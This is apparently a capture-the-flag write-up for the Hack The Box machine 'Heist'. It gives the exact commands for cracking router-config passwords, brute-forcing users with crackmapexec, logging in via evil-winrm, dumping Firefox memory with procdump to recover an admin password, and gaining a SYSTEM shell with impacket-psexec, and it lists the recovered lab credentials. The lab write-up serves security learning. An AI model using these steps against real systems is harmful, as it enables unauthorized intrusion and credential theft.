From our nmap scan we have quite a number of ports opened. We'll start our enumeration today from port 80



# Enumeration (Port 80)

We get this login page. Since we don't have any creds lets login as guest

Nice, this is a conversation between user ```Hazard``` and the ```admin```. 

Lets check out the configuration file user ```Hazard``` sent.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ce07dae4-06f7-4a39-96f6-d0f0e693bc2f)

From the above screenshot we can see encrypted passwords for users ```Hazard```, ```rout3r``` and ```admin```.

Lets try to crack the first password

We got the password to be ```stealth1agent```. Lets try gain access using winrm

command:```evil-winrm -u hazard -i 10.129.96.157 -p 'stealth1agent' -S```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84a4e6da-f73f-4053-8bf5-7fc5578fc32d)

oops, it didn't work

Lets try to crack the type 7 passwords. I used this online [tool](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html) for it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4d258bd0-7e89-40bd-8ef3-da86a9befa38)

We now have 3 passwords, lets enumerate for potential users

We can try to enumerate users from the smb share using crackmapexec

command:```crackmapexec smb 10.129.94.141 -u hazard -p stealth1agent --rid-brute```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b270dc27-6a75-47cd-8fad-70cdb37fc033)

We now have potential users.

Save the users and passwords in different files, we'll use crackmapexec to get a match we can use to login via winrm

command:```crackmapexec winrm 10.129.94.141 -u users.txt -p passwords.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e8ffff8c-6d52-4417-b959-d454035fecd2)

We got a match, now lets login with winrm

username:```chase```        password:```Q4)sJu\Y8qz*A3?d```

command:```evil-winrm -u chase -i 10.129.94.141 -p "Q4)sJu\Y8qz*A3?d"```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/18e837e5-3695-4a51-849f-9418a416e3b1)

We got user shell hehe. Lets go ahead and escalate our privileges



# Privilege Escalation

Running the ```ps``` command to check the processes running

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d6d43f37-4ccf-4210-b6ac-680a1fa34a73)

From the above screenshot we can see ```firefox``` to be one of the processes running

Lets try to dump the process using the tool ```procdump```. You can download it [here](https://download.sysinternals.com/files/Procdump.zip)

We'll upload this to the target's machine

command:```upload procdump.exe```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc1db26a-3f6a-42f4-bdc3-c2df787ec936)

Nice, we can use the PID of firefox to create this dump

command:```.\procdump.exe -accepteula -ma 4120```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/997e143e-31f7-4047-bce6-a209d020c16b)

So after creating the dump, I downloaded it to my machine using the ```download``` command

```
â”Œâ”€â”€(bl4ck4nonðŸ‘½bl4ck4non-sec)-[~/Downloads/HTB/heist]
â””â”€$ ls

â”Œâ”€â”€(bl4ck4nonðŸ‘½bl4ck4non-sec)-[~/Downloads/HTB/heist]
â””â”€$ file firefox.exe_231011_124132.dmp

```
Now, lets look for creds

command:```strings firefox.exe_231011_124132.dmp| grep "password"```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/466acabe-3802-4b09-a250-ddd05224e40f)

nice nice, we got the admin password. 

Now, lets use psexec to connect

username:```administrator```      password:```4dD!5}x/re8]FBuZ```

command:```impacket-psexec administrator@10.129.94.202```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eea8a90c-64f4-459a-a4c8-b9d10cb5f1e6)

We spwned a shell as ```nt authority\system```, this means we have successfully pwned this box.

That will be all for today
